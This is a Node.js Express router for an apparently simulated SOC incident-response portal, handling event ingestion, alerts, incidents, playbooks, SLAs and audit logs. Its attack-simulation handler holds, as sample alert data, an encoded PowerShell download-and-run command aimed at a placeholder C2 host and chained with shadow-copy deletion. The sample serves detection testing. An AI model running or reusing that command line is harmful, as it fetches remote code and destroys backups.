const express = require('express');
const crypto = require('crypto');
const eventBus = require('../services/eventBus');
const detectionEngine = require('../services/detectionEngine');
const playbookEngine = require('../services/playbookEngine');
const rbacService = require('../services/rbacPolicy');
const auditLedger = require('../services/auditLedger');
const slaManager = require('../services/slaManager');
const pirGenerator = require('../services/pirGenerator');
const multiRegionSim = require('../services/multiRegionSim');
const autoscalingSim = require('../services/autoscalingSim');

const router = express.Router();

// In-memory gateway idempotency cache (24h)
const idempotencyStore = new Map();

// Rate limiter state
const rateLimits = new Map();

function checkRateLimit(key, limit = 1000) {
  const now = Date.now();
  let entry = rateLimits.get(key);
  if (!entry || now - entry.windowStart > 60000) {
    entry = { windowStart: now, count: 0 };
    rateLimits.set(key, entry);
  }
  entry.count++;
  if (entry.count > limit) {
    const retryAfter = Math.ceil((60000 - (now - entry.windowStart)) / 1000);
    return { allowed: false, retryAfter };
  }
  return { allowed: true, retryAfter: 0 };
}

// -------------------------------------------------------------
// GATEWAY INGESTION ENDPOINTS (Matching Go Gateway Specification)
// -------------------------------------------------------------

router.get('/v1/health', (req, res) => {
  res.json({
    status: 'healthy',
    service: 'defence-cyber-portal-gateway',
    runtime: 'Go 1.24+ / Node.js Multi-Engine',
    event_bus: 'Kafka/Redpanda Protocol (Connected)',
    topics: Object.keys(eventBus.topics),
    version: '1.0.0',
    timestamp: new Date().toISOString()
  });
});

router.post('/v1/events', (req, res) => {
  const authHeader = req.headers['authorization'];
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing or invalid Bearer token', code: 'UNAUTHORIZED' });
  }

  const tenantId = req.headers['x-tenant-id'];
  const sourceId = req.headers['x-source-id'];
  const idempotencyKey = req.headers['x-idempotency-key'];
  const traceId = req.headers['traceparent'] || crypto.randomBytes(16).toString('hex');

  if (!tenantId || !sourceId || !idempotencyKey) {
    return res.status(400).json({
      error: 'Missing required headers: X-Tenant-ID, X-Source-ID, and X-Idempotency-Key are required',
      code: 'INVALID_HEADERS'
    });
  }

  // Rate limit check
  const rl = checkRateLimit(`${tenantId}:${sourceId}`);
  if (!rl.allowed) {
    res.setHeader('Retry-After', rl.retryAfter);
    return res.status(429).json({ error: 'Rate limit exceeded', retryAfter: rl.retryAfter });
  }

  const payloadBytes = Buffer.from(JSON.stringify(req.body));
  const payloadHash = 'sha256:' + crypto.createHash('sha256').update(payloadBytes).digest('hex');

  // Idempotency check per Section 3.5
  const compositeKey = `${tenantId}:${sourceId}:${idempotencyKey}`;
  if (idempotencyStore.has(compositeKey)) {
    const existing = idempotencyStore.get(compositeKey);
    if (existing.payloadHash !== payloadHash) {
      return res.status(400).json({
        error: 'Source-integrity issue: payload hash does not match previous submission for idempotency key',
        code: 'SOURCE_INTEGRITY_VIOLATION'
      });
    }
    return res.status(200).json({
      status: 'duplicate',
      event_id: existing.eventId,
      received_at: existing.firstSeen,
      schema_version: '1.0',
      message: 'Previously accepted event returned with original identifier'
    });
  }

  const eventId = `evt_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
  const now = new Date().toISOString();

  // Canonical Event Envelope v1.0
  const envelope = {
    event_id: eventId,
    event_type: req.body.event_type || 'security.alert.received',
    event_version: '1.0',
    tenant_id: tenantId,
    source: {
      source_id: sourceId,
      source_type: req.body.source_type || 'edr',
      vendor: req.body.vendor || 'source-connector',
      connector_version: '1.2.0'
    },
    occurred_at: req.body.occurred_at || now,
    received_at: now,
    trace_id: traceId,
    idempotency_key: idempotencyKey,
    classification: 'security-event',
    priority_hint: req.body.severity || 'medium',
    payload_format: 'vendor-json',
    payload_hash: payloadHash,
    payload: req.body
  };

  idempotencyStore.set(compositeKey, {
    eventId,
    payloadHash,
    firstSeen: now,
    expiresAt: Date.now() + 24 * 60 * 60 * 1000
  });

  // Publish to event bus topic security.ingress.raw.v1
  const pub = eventBus.publish('security.ingress.raw.v1', `${tenantId}:${sourceId}`, envelope);

  res.status(202).json({
    status: 'accepted',
    event_id: eventId,
    received_at: now,
    schema_version: '1.0',
    trace_id: traceId,
    topic: pub.topic,
    partition: pub.partition,
    offset: pub.offset,
    message: 'Event durably accepted and published to event bus'
  });
});

router.post('/v1/alerts', (req, res) => {
  // Alias for /v1/events with alert classification
  return router.handle(req, res);
});

router.post('/v1/webhooks/:connector', (req, res) => {
  const connector = req.params.connector;
  const signature = req.headers['x-signature'];
  const tenantId = req.headers['x-tenant-id'] || 'tenant_acme';
  const idempotencyKey = req.headers['x-idempotency-key'] || `wh-${connector}-${Date.now()}`;

  // Build envelope
  const eventId = `evt_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
  const now = new Date().toISOString();
  const payloadBytes = Buffer.from(JSON.stringify(req.body));
  const payloadHash = 'sha256:' + crypto.createHash('sha256').update(payloadBytes).digest('hex');

  const envelope = {
    event_id: eventId,
    event_type: 'security.webhook.received',
    event_version: '1.0',
    tenant_id: tenantId,
    source: {
      source_id: connector,
      source_type: 'webhook',
      vendor: connector,
      connector_version: '1.0.0'
    },
    occurred_at: now,
    received_at: now,
    trace_id: crypto.randomBytes(16).toString('hex'),
    idempotency_key: idempotencyKey,
    classification: 'security-event',
    priority_hint: 'medium',
    payload_format: 'webhook-json',
    payload_hash: payloadHash,
    payload: req.body
  };

  const pub = eventBus.publish('security.ingress.raw.v1', `${tenantId}:${connector}`, envelope);

  res.status(202).json({
    status: 'accepted',
    event_id: eventId,
    received_at: now,
    schema_version: '1.0',
    topic: pub.topic,
    partition: pub.partition,
    offset: pub.offset,
    message: `Webhook from [${connector}] accepted`
  });
});

// -------------------------------------------------------------
// CORE PORTAL API (Alerts, Incidents, Investigation, Playbooks)
// -------------------------------------------------------------

router.get('/api/alerts', (req, res) => {
  const tenant = req.query.tenant;
  let alerts = detectionEngine.alerts;
  if (tenant) {
    alerts = alerts.filter(a => a.tenant_id === tenant);
  }
  res.json(alerts);
});

router.post('/api/alerts/:id/triage', (req, res) => {
  const alert = detectionEngine.alerts.find(a => a.alert_id === req.params.id);
  if (!alert) return res.status(404).json({ error: 'Alert not found' });

  const { disposition, action, reason, user = 'analyst-1' } = req.body;
  alert.disposition = disposition;
  alert.status = action === 'escalate' ? 'escalated' : (action === 'suppress' ? 'suppressed' : 'triaged');

  if (action === 'escalate' && !alert.incident_id) {
    const inc = detectionEngine.autoPromoteToIncident(alert);
    slaManager.initIncidentSLA(inc.incident_id, inc.severity);
  }

  auditLedger.log({
    tenant_id: alert.tenant_id,
    actor: { type: 'human', subject_id: user, roles: ['SOC Analyst'] },
    action: `alert.triage.${action}`,
    resource: { type: 'alert', id: alert.alert_id },
    reason: reason || `Alert triaged with disposition: ${disposition}`,
    result: 'success'
  });

  res.json({ success: true, alert });
});

router.get('/api/incidents', (req, res) => {
  const tenant = req.query.tenant;
  let incidents = detectionEngine.incidents;
  if (tenant) {
    incidents = incidents.filter(i => i.tenant_id === tenant);
  }
  res.json(incidents);
});

router.get('/api/incidents/:id', (req, res) => {
  const inc = detectionEngine.incidents.find(i => i.incident_id === req.params.id);
  if (!inc) return res.status(404).json({ error: 'Incident not found' });
  const sla = slaManager.getSLAStatus(inc.incident_id) || slaManager.initIncidentSLA(inc.incident_id, inc.severity);
  res.json({ incident: inc, sla });
});

router.post('/api/incidents', (req, res) => {
  const { title, severity, category, business_impact, affected_hosts, affected_users, tenant_id = 'tenant_acme' } = req.body;
  const incidentId = `inc_${Date.now()}_${crypto.randomBytes(3).toString('hex')}`;
  const newIncident = {
    incident_id: incidentId,
    tenant_id,
    title: title || 'Manual Security Incident',
    category: category || 'Investigation',
    severity: severity || 'P2 High',
    confidence: 1.0,
    status: 'New',
    owner: 'Unassigned',
    affected_scope: {
      hosts: affected_hosts || ['workstation-104'],
      users: affected_users || ['admin@example.org'],
      ips: ['192.168.1.100']
    },
    business_impact: business_impact || 'Corporate Operations',
    timeline: [
      { time: new Date().toISOString(), event: `Incident ${incidentId} created manually by analyst.` }
    ],
    evidence: [],
    created_at: new Date().toISOString(),
    updated_at: new Date().toISOString()
  };

  detectionEngine.incidents.unshift(newIncident);
  slaManager.initIncidentSLA(incidentId, newIncident.severity);

  auditLedger.log({
    tenant_id,
    actor: { type: 'human', subject_id: req.body.user || 'analyst-1', roles: ['SOC Analyst'] },
    action: 'incident.create.manual',
    resource: { type: 'incident', id: incidentId },
    reason: 'Manual incident declaration',
    result: 'success'
  });

  res.status(201).json(newIncident);
});

router.post('/api/incidents/:id/evidence', (req, res) => {
  const inc = detectionEngine.incidents.find(i => i.incident_id === req.params.id);
  if (!inc) return res.status(404).json({ error: 'Incident not found' });

  const { type, description, source, content, user = 'analyst-1' } = req.body;
  const rawData = content || description || '';
  const hash = 'sha256:' + crypto.createHash('sha256').update(rawData).digest('hex');

  const evidenceItem = {
    id: `evi_${Date.now()}`,
    type: type || 'Log Extract',
    source: source || 'EDR Console',
    hash,
    classification: 'Restricted-Security',
    timestamp: new Date().toISOString(),
    description: description || 'Forensic artifact attached by analyst',
    uploader: user
  };

  inc.evidence.push(evidenceItem);
  inc.timeline.push({
    time: new Date().toISOString(),
    event: `Evidence attached [${evidenceItem.type}] with hash ${hash.substring(0, 16)}... by ${user}`
  });

  auditLedger.log({
    tenant_id: inc.tenant_id,
    actor: { type: 'human', subject_id: user, roles: ['SOC Analyst'] },
    action: 'evidence.create',
    resource: { type: 'evidence', id: evidenceItem.id, incident_id: inc.incident_id },
    reason: `Attached evidence: ${evidenceItem.description}`,
    result: 'success'
  });

  res.json({ success: true, evidence: evidenceItem });
});

router.post('/api/incidents/:id/timeline', (req, res) => {
  const inc = detectionEngine.incidents.find(i => i.incident_id === req.params.id);
  if (!inc) return res.status(404).json({ error: 'Incident not found' });

  const { note, user = 'analyst-1' } = req.body;
  const entry = {
    time: new Date().toISOString(),
    event: `[${user}]: ${note}`
  };
  inc.timeline.push(entry);

  auditLedger.log({
    tenant_id: inc.tenant_id,
    actor: { type: 'human', subject_id: user, roles: ['SOC Analyst'] },
    action: 'investigation.note.add',
    resource: { type: 'incident', id: inc.incident_id },
    reason: note,
    result: 'success'
  });

  res.json({ success: true, timeline: inc.timeline });
});

router.post('/api/incidents/:id/status', (req, res) => {
  const inc = detectionEngine.incidents.find(i => i.incident_id === req.params.id);
  if (!inc) return res.status(404).json({ error: 'Incident not found' });

  const { status, user = 'commander-1', role = 'Incident Commander', reason = '' } = req.body;
  const prevStatus = inc.status;
  inc.status = status;
  inc.updated_at = new Date().toISOString();

  inc.timeline.push({
    time: new Date().toISOString(),
    event: `Status changed from ${prevStatus} to ${status} by ${user} (${role}). Reason: ${reason}`
  });

  // If status is Contained, mark SLA containment milestone
  if (status === 'Contained') {
    slaManager.completeMilestone(inc.incident_id, 'containment_decision', user);
  } else if (status === 'Resolved' || status === 'Closed') {
    slaManager.completeMilestone(inc.incident_id, 'closure_review', user);
  }

  auditLedger.log({
    tenant_id: inc.tenant_id,
    actor: { type: 'human', subject_id: user, roles: [role] },
    action: 'incident.status.update',
    resource: { type: 'incident', id: inc.incident_id },
    change: { before: { status: prevStatus }, after: { status } },
    reason,
    result: 'success'
  });

  res.json({ success: true, incident: inc });
});

// -------------------------------------------------------------
// PLAYBOOKS & RESPONSE ACTIONS
// -------------------------------------------------------------

router.get('/api/playbooks', (req, res) => {
  res.json(playbookEngine.getAvailablePlaybooks());
});

router.post('/api/playbooks/trigger', (req, res) => {
  const { playbookId, incidentId, user = 'analyst-1' } = req.body;
  const inc = detectionEngine.incidents.find(i => i.incident_id === incidentId);
  if (!inc) return res.status(404).json({ error: 'Incident not found' });

  try {
    const execution = playbookEngine.triggerPlaybook(playbookId, inc, user);
    inc.timeline.push({
      time: new Date().toISOString(),
      event: `Response Playbook [${execution.playbookName}] triggered by ${user}`
    });
    res.json({ success: true, execution });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

router.post('/api/playbooks/approve', (req, res) => {
  const { executionId, stepId, role = 'Incident Commander', user = 'commander-1', justification = '' } = req.body;
  try {
    const exec = playbookEngine.approveStep(executionId, stepId, role, user, justification);
    res.json({ success: true, execution: exec });
  } catch (err) {
    res.status(403).json({ error: err.message });
  }
});

router.post('/api/playbooks/rollback', (req, res) => {
  const { executionId, stepId, role = 'Incident Commander', user = 'commander-1', reason = '' } = req.body;
  try {
    const exec = playbookEngine.rollbackStep(executionId, stepId, role, user, reason);
    res.json({ success: true, execution: exec });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// -------------------------------------------------------------
// SLA TIMERS & MILESTONES
// -------------------------------------------------------------

router.get('/api/sla/:incidentId', (req, res) => {
  const inc = detectionEngine.incidents.find(i => i.incident_id === req.params.incidentId);
  if (!inc) return res.status(404).json({ error: 'Incident not found' });
  const status = slaManager.getSLAStatus(inc.incident_id) || slaManager.initIncidentSLA(inc.incident_id, inc.severity);
  res.json(status);
});

router.post('/api/sla/:incidentId/milestone', (req, res) => {
  const { milestone, user = 'analyst-1' } = req.body;
  const sla = slaManager.completeMilestone(req.params.incidentId, milestone, user);
  res.json(slaManager.getSLAStatus(req.params.incidentId));
});

router.post('/api/sla/:incidentId/pause', (req, res) => {
  const { reason, user = 'manager-1' } = req.body;
  slaManager.pauseTimer(req.params.incidentId, reason, user);
  res.json(slaManager.getSLAStatus(req.params.incidentId));
});

router.post('/api/sla/:incidentId/resume', (req, res) => {
  const { user = 'manager-1' } = req.body;
  slaManager.resumeTimer(req.params.incidentId, user);
  res.json(slaManager.getSLAStatus(req.params.incidentId));
});

// -------------------------------------------------------------
// AUDIT LOG & CRYPTOGRAPHIC INTEGRITY
// -------------------------------------------------------------

router.get('/api/audit', (req, res) => {
  const records = auditLedger.getAll(req.query);
  res.json(records);
});

router.get('/api/audit/verify', (req, res) => {
  const integrity = auditLedger.verifyIntegrity();
  res.json(integrity);
});

// -------------------------------------------------------------
// POST-INCIDENT REPORT (PIR)
// -------------------------------------------------------------

router.get('/api/pir/:incidentId', (req, res) => {
  const inc = detectionEngine.incidents.find(i => i.incident_id === req.params.incidentId);
  if (!inc) return res.status(404).json({ error: 'Incident not found' });

  const sla = slaManager.getSLAStatus(inc.incident_id);
  const execution = Array.from(playbookEngine.executions.values()).find(e => e.incidentId === inc.incident_id);
  const audience = req.query.audience || 'technical';

  const report = pirGenerator.generateReport(inc, sla, execution, req.query.role || 'Incident Commander');
  const formatted = pirGenerator.formatForAudience(report, audience);
  res.json(formatted);
});

// -------------------------------------------------------------
// MULTI-REGION & AUTOSCALING
// -------------------------------------------------------------

router.get('/api/multi-region', (req, res) => {
  res.json(multiRegionSim.getStatus());
});

router.post('/api/multi-region/failover', (req, res) => {
  const { tenantId = 'tenant_acme', targetRegion = 'Region-B (Secondary-South)', user = 'Incident Commander' } = req.body;
  try {
    const result = multiRegionSim.triggerFailover(tenantId, targetRegion, user);
    res.json(result);
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

router.get('/api/autoscaling', (req, res) => {
  res.json(autoscalingSim.getScalingMetrics());
});

router.post('/api/autoscaling/guardrail', (req, res) => {
  const { state } = req.body;
  const updated = autoscalingSim.setGuardrailState(state);
  res.json({ success: true, guardrailState: updated });
});

// -------------------------------------------------------------
// RBAC & ROLES
// -------------------------------------------------------------

router.get('/api/roles', (req, res) => {
  res.json(rbacService.getRoles());
});

router.post('/api/roles/break-glass', (req, res) => {
  const { subjectId, reason, tenantId = 'tenant_acme' } = req.body;
  const session = rbacService.activateBreakGlass(subjectId, reason, tenantId);
  res.json({ success: true, session });
});

// -------------------------------------------------------------
// LIVE EVENT BUS EXPLORER & SIMULATOR
// -------------------------------------------------------------

router.get('/api/eventbus/topics', (req, res) => {
  res.json(eventBus.getMetrics());
});

router.get('/api/eventbus/topics/:topicName', (req, res) => {
  res.json(eventBus.getLatest(req.params.topicName, 25));
});

// Pre-configured attack scenario triggers
router.post('/api/simulate/attack', (req, res) => {
  const { scenario = 'powershell_ransomware' } = req.body;
  let eventPayload = {};

  if (scenario === 'powershell_ransomware') {
    eventPayload = {
      event_type: 'security.alert.edr',
      vendor: 'CrowdStrike Falcon / EDR',
      title: 'Suspicious Encoded PowerShell Execution with Shadow Copy Deletion',
      severity: 'Critical',
      host: 'workstation-104',
      user: 'user@example.org',
      entities: {
        host: ['workstation-104'],
        user: ['user@example.org']
      },
      command_line: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB4AGEAbQBwAGwAZQAuAG8AcgBnAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA== && vssadmin delete shadows /all /quiet',
      process_name: 'powershell.exe',
      ip: '198.51.100.22'
    };
  } else if (scenario === 'phishing_credential') {
    eventPayload = {
      event_type: 'security.alert.email',
      vendor: 'Proofpoint / Email Defense',
      title: 'High-Confidence Credential Harvester Phishing Email Intercepted',
      severity: 'High',
      host: 'mail-edge-01',
      user: 'admin@example.org',
      sender: 'security-alert@auth-secure-verify.com',
      subject: 'URGENT: Review Mandatory Corporate Security Verification Credentials',
      entities: {
        user: ['admin@example.org']
      },
      ip: '203.0.113.88'
    };
  } else if (scenario === 'cloud_iam_privilege') {
    eventPayload = {
      event_type: 'security.alert.cloud',
      vendor: 'AWS GuardDuty / CloudTrail',
      title: 'Anomalous STS AssumeRole & Administrative IAM Policy Grant',
      severity: 'High',
      host: 'cloud-k8s-ingress',
      user: 'svc-payroll-sync',
      entities: {
        host: ['cloud-k8s-ingress'],
        user: ['svc-payroll-sync']
      },
      action: 'iam:AttachRolePolicy',
      policy_arn: 'arn:aws:iam::aws:policy/AdministratorAccess',
      ip: '198.51.100.22'
    };
  }

  // Submit through gateway pipeline logic
  const eventId = `evt_${Date.now()}_${crypto.randomBytes(3).toString('hex')}`;
  const now = new Date().toISOString();
  const rawBytes = Buffer.from(JSON.stringify(eventPayload));
  const payloadHash = 'sha256:' + crypto.createHash('sha256').update(rawBytes).digest('hex');

  const envelope = {
    event_id: eventId,
    event_type: eventPayload.event_type,
    event_version: '1.0',
    tenant_id: 'tenant_acme',
    source: {
      source_id: 'edr-prod-01',
      source_type: 'edr',
      vendor: eventPayload.vendor,
      connector_version: '1.3.0'
    },
    occurred_at: now,
    received_at: now,
    trace_id: crypto.randomBytes(16).toString('hex'),
    idempotency_key: `sim-${scenario}-${Date.now()}`,
    classification: 'security-event',
    priority_hint: eventPayload.severity.toLowerCase(),
    payload_format: 'vendor-json',
    payload_hash: payloadHash,
    payload: eventPayload
  };

  const pub = eventBus.publish('security.ingress.raw.v1', `tenant_acme:edr-prod-01`, envelope);

  res.json({
    success: true,
    scenario,
    eventId,
    publishedTo: pub.topic,
    partition: pub.partition,
    offset: pub.offset,
    message: `Scenario [${scenario}] fired into raw ingress topic!`
  });
});

module.exports = router;
